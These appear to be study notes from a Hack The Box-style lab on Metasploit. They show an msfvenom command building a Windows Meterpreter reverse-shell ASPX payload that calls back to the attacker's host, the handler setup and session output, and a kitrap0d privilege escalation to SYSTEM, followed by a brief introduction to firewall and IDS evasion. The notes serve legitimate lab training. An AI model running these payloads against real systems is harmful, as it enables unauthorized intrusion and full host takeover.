---
icon: hourglass-start
---

# Additional Features

## Intro to MSFVenom

***

`MSFVenom` is the successor of `MSFPayload` and `MSFEncode`, two stand-alone scripts that used to work in conjunction with `msfconsole` to provide users with highly customizable and hard-to-detect payloads for their exploits.

Let's say we have ftp anonymous access and we see this ->

```shell-session
ftp> ls

200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
```

We see the aspnet\_client which means that the box will be able to run `.aspx` reverse shells.

```shell-session
ElFelixi0@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

Now we need to set up a multi handler with msf

```shell-session
msf6 > use multi/handler
```

If we navigate to [http://10.10.10.5/reverse\_shell.aspx](http://10.10.10.5/reverse\_shell.aspx)  we can trigger the `.aspx` payload on the web service.

```shell-session
[*] Started reverse TCP handler on 10.10.14.5:1337 

[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.5:1337 -> 10.10.10.5:49157) at 2020-08-28 16:33:14 +0000


meterpreter > getuid

Server username: IIS APPPOOL\Web
```

### Local Exploit Suggester

It's a module called the `Local Exploit Suggester`. We will be using this module for this example, as the Meterpreter shell landed on the `IIS APPPOOL\Web` user, which naturally does not have many permissions. Furthermore, running the `sysinfo` command shows us that the system is of x86 bit architecture, giving us even more reason to trust the Local Exploit Suggester.

```shell-session
msf6 > search local exploit suggester

<...SNIP...>
   2375  post/multi/manage/screenshare                                                              normal     No     Multi Manage the screen of the target meterpreter session
   2376  post/multi/recon/local_exploit_suggester                                                   normal     No     Multi Recon Local Exploit Suggester
   2377  post/osx/gather/apfs_encrypted_volume_passwd                              2018-03-21       normal     Yes    Mac OS X APFS Encrypted Volume Password Disclosure

<SNIP>

msf6 exploit(multi/handler) > use 2376
msf6 post(multi/recon/local_exploit_suggester) > show options
<SNIP>

msf6 post(multi/recon/local_exploit_suggester) > set session 2

session => 2


msf6 post(multi/recon/local_exploit_suggester) > run
```

**Local Privilege Escalation**

```shell-session
msf6 exploit(multi/handler) > search kitrap0d

<SNIP>

msf6 exploit(multi/handler) > use 0
msf6 exploit(windows/local/ms10_015_kitrap0d) > show options
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 1338
msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3
msf6 exploit(windows/local/ms10_015_kitrap0d) > run
<sNIP>
meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

## Firewall and IDS/IPS Evasion

Here we will see&#x20;

* Endpoint protection
* Perimeter protection

`Endpoint protection` refers to any localized device or service whose sole purpose is to protect a single host on the network. The host can be a personal computer, a corporate workstation, or a server in a network's De-Militarized Zone (`DMZ`).

Endpoint protection usually comes in the form of software packs which include `Antivirus Protection`, `Antimalware Protection` (this includes bloatware, spyware, adware, scareware, ransomware), `Firewall`, and `Anti-DDOS` all in one, under the same software package.

***

`Perimeter protection` usually comes in physical or virtualized devices on the network perimeter edge. These `edge devices` themselves provide access `inside` of the network from the `outside`, in other terms, from `public` to `private`.

Between these two zones, on some occasions, we will also find a third one, called the De-Militarized Zone (`DMZ`), which was mentioned previously. This is a `lower-security policy level` zone than the `inside networks'` one, but with a higher `trust level` than the `outside zone`, which is the vast Internet.
